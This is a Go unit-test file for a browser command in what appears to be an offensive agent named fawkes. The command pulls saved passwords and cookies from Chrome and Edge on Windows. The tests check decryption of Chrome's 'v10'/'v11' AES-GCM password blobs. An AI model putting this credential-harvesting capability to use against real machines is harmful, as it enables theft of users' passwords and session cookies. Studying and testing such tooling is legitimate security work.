//go:build windows

package commands

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"testing"

	"fawkes/pkg/structs"
)

func TestBrowserCommand_EmptyParams(t *testing.T) {
	cmd := &BrowserCommand{}
	result := cmd.Execute(structs.Task{Params: ""})
	// Should run with default args (passwords, all) — will report no browsers found
	if result.Status != "success" {
		t.Errorf("expected success status with empty params, got %q: %s", result.Status, result.Output)
	}
}

func TestBrowserCommand_InvalidJSON(t *testing.T) {
	cmd := &BrowserCommand{}
	result := cmd.Execute(structs.Task{Params: "not json"})
	// Should fall back to defaults
	if result.Status != "success" {
		t.Errorf("expected success status with invalid JSON, got %q", result.Status)
	}
}

func TestBrowserCommand_ChromeOnly(t *testing.T) {
	cmd := &BrowserCommand{}
	result := cmd.Execute(structs.Task{Params: `{"browser":"chrome"}`})
	if result.Status != "success" {
		t.Errorf("expected success, got %q: %s", result.Status, result.Output)
	}
}

func TestBrowserCommand_EdgeOnly(t *testing.T) {
	cmd := &BrowserCommand{}
	result := cmd.Execute(structs.Task{Params: `{"browser":"edge"}`})
	if result.Status != "success" {
		t.Errorf("expected success, got %q: %s", result.Status, result.Output)
	}
}

func TestDecryptPassword_AES_GCM(t *testing.T) {
	// Create a known key and encrypt some test data
	key := make([]byte, 32)
	if _, err := rand.Read(key); err != nil {
		t.Fatal(err)
	}

	plaintext := "testpassword123"
	nonce := make([]byte, 12)
	if _, err := rand.Read(nonce); err != nil {
		t.Fatal(err)
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		t.Fatal(err)
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		t.Fatal(err)
	}

	ciphertext := gcm.Seal(nil, nonce, []byte(plaintext), nil)

	// Build the encrypted blob: "v10" + nonce + ciphertext
	encrypted := append([]byte("v10"), nonce...)
	encrypted = append(encrypted, ciphertext...)

	result, err := decryptPassword(encrypted, key)
	if err != nil {
		t.Fatalf("decryptPassword failed: %v", err)
	}
	if result != plaintext {
		t.Errorf("expected %q, got %q", plaintext, result)
	}
}

func TestDecryptPassword_V11Prefix(t *testing.T) {
	key := make([]byte, 32)
	if _, err := rand.Read(key); err != nil {
		t.Fatal(err)
	}

	plaintext := "v11password"
	nonce := make([]byte, 12)
	if _, err := rand.Read(nonce); err != nil {
		t.Fatal(err)
	}

	block, _ := aes.NewCipher(key)
	gcm, _ := cipher.NewGCM(block)
	ciphertext := gcm.Seal(nil, nonce, []byte(plaintext), nil)

	encrypted := append([]byte("v11"), nonce...)
	encrypted = append(encrypted, ciphertext...)

	result, err := decryptPassword(encrypted, key)
	if err != nil {
		t.Fatalf("decryptPassword failed: %v", err)
	}
	if result != plaintext {
		t.Errorf("expected %q, got %q", plaintext, result)
	}
}

func TestDecryptPassword_TooShort(t *testing.T) {
	_, err := decryptPassword([]byte("v10abc"), make([]byte, 32))
	if err == nil {
		t.Error("expected error for too-short encrypted data")
	}
}

func TestDecryptPassword_WrongKey(t *testing.T) {
	key := make([]byte, 32)
	rand.Read(key)
	wrongKey := make([]byte, 32)
	rand.Read(wrongKey)

	nonce := make([]byte, 12)
	rand.Read(nonce)

	block, _ := aes.NewCipher(key)
	gcm, _ := cipher.NewGCM(block)
	ciphertext := gcm.Seal(nil, nonce, []byte("secret"), nil)

	encrypted := append([]byte("v10"), nonce...)
	encrypted = append(encrypted, ciphertext...)

	_, err := decryptPassword(encrypted, wrongKey)
	if err == nil {
		t.Error("expected error with wrong key")
	}
}

func TestBrowserCommand_CookiesAction(t *testing.T) {
	cmd := &BrowserCommand{}
	result := cmd.Execute(structs.Task{Params: `{"action":"cookies"}`})
	// Should succeed even with no browsers installed
	if result.Status != "success" {
		t.Errorf("expected success for cookies action, got %q: %s", result.Status, result.Output)
	}
}

func TestBrowserCommand_CookiesChromeOnly(t *testing.T) {
	cmd := &BrowserCommand{}
	result := cmd.Execute(structs.Task{Params: `{"action":"cookies","browser":"chrome"}`})
	if result.Status != "success" {
		t.Errorf("expected success, got %q: %s", result.Status, result.Output)
	}
}
